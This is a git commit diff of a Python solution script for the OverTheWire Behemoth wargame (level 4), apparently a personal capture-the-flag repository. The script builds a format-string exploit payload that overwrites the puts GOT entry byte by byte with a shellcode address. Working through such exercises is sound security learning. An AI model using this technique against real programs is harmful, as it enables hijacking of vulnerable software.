738186c278da2a99d5cf14401ed48e2e795b31db
avishaigonen123 <avishaigonen@gmail.com>
2024-12-09 23:35:30 +0200

    solved behemoth3 and behemoth4

--- overthewire/behemoth/scripts/level4.py
+++ overthewire/behemoth/scripts/level4.py
@@ -4,7 +4,7 @@ import sys
 PATH = '/behemoth/behemoth4'
 
 address_of_puts = 0x0804b218
-address_of_shellcode = 0xffffffff
+address_of_shellcode = 0xffffd510
 
 payload = b'JUNK' 
 payload += p32(address_of_puts)
@@ -15,13 +15,63 @@ payload += p32(address_of_puts+2)
 payload += b'JUNK' 
 payload += p32(address_of_puts+3)
 
-counter = 4*8
+printed_chars = len(payload)
 byte_to_insert = address_of_shellcode & 0xff
-res = byte_to_insert - counter
+print(byte_to_insert)
+res = byte_to_insert - printed_chars
 
-if res < 0:
-    raise ValueError  
+print("res is:",res)
+if res <= 0:
+    while res <= 0:
+        res += 0x100
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res
+else:
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res 
 
-payload += b'%x' + str(res).encode() + b'%n'
+
+byte_to_insert = (address_of_shellcode & (0xff << 8) ) >> 8
+print(byte_to_insert)
+res = byte_to_insert - printed_chars
+print("res is:",res)
+if res <= 0:
+    while res <= 0:
+        res += 0x100
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res
+else:
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res
+
+
+byte_to_insert = (address_of_shellcode & (0xff << 16) ) >> 16
+print(byte_to_insert)
+res = byte_to_insert - printed_chars
+print("res is:",res)
+if res <= 0:
+    while res <= 0:
+        res += 0x100
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res
+else:
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res
+
+
+byte_to_insert = (address_of_shellcode & (0xff << 24) ) >> 24
+print(byte_to_insert)
+res = byte_to_insert - printed_chars
+print("res is:",res)
+if res <= 0:
+    while res <= 0:
+        res += 0x100
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res
+
+else:
+    payload += b'%' + str(res).encode()+ b'x'  + b'%n'
+    printed_chars += res
+
 
 sys.stdout.buffer.write(payload)
